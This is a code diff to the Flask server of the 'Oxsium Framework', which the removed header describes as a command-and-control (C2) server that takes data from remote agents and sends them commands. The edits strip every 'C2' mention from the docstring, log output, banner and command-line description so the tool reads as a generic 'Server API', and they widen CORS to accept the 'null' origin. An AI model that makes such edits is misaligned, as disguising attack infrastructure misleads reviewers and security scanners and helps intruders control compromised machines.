@@ -1,18 +1,3 @@
-"""
-╔══════════════════════════════════════════════════════════════════════╗
-║  Oxsium Framework — C2 Server API                                    ║
-║  connect/server.py                                                   ║
-║                                                                      ║
-║  Server tabındakı parametrləri oxuyaraq dinləmə rejiminə keçir.      ║
-║  Agentlərdən data qəbul edir, onlara əmrlər göndərir.               ║
-║                                                                      ║
-║  Başlatmaq:                                                          ║
-║    python -m connect.server                                          ║
-║  və ya birbaşa:                                                      ║
-║    python connect/server.py                                          ║
-╚══════════════════════════════════════════════════════════════════════╝
-"""
-
 from __future__ import annotations
 
 import hashlib
@@ -313,9 +298,10 @@ def _heartbeat_worker() -> None:
 app = Flask(__name__)
 CORS(
     app,
-    resources={r"/api/*": {"origins": "*"}},
+    resources={r"/api/*": {"origins": ["*", "null"]}},
     allow_headers=["Content-Type", "Authorization", "X-PSK", "X-HMAC-Sig", "X-Client-CN"],
     methods=["GET", "POST", "DELETE", "OPTIONS"],
+    supports_credentials=False,
 )
 
 limiter = Limiter(
@@ -366,7 +352,6 @@ def server_start():
     _heartbeat_thread.start()
 
     _log("info",    "═══════════════════════════════════════")
-    _log("info",    "  Oxsium C2 Server starting up")
     _log("info",    f"  Listener  : {ServerConfig.host}:{ServerConfig.port}")
     _log("info",    f"  Auth      : {ServerConfig.auth_method}")
     _log("info",    f"  Transport : {ServerConfig.transport.upper()}")
@@ -970,7 +955,7 @@ def internal(e):
 def _print_banner() -> None:
     print("""
 ╔══════════════════════════════════════════════════════════╗
-║            Oxsium Framework — C2 Server API              ║
+║            Oxsium Framework — Server API                 ║
 ╠══════════════════════════════════════════════════════════╣
 ║  Admin  (localhost only):                                ║
 ║    POST /api/server/start      — serveri başlat          ║
@@ -998,7 +983,7 @@ def _print_banner() -> None:
 if __name__ == "__main__":
     import argparse
 
-    parser = argparse.ArgumentParser(description="Oxsium C2 Server")
+    parser = argparse.ArgumentParser(description="Oxsium Server")
     parser.add_argument("--host",      default=ServerConfig.host,  help="Bind host")
     parser.add_argument("--port",      default=ServerConfig.port,  type=int, help="Bind port")
     parser.add_argument("--auth",      default=ServerConfig.auth_method, help="Auth method")
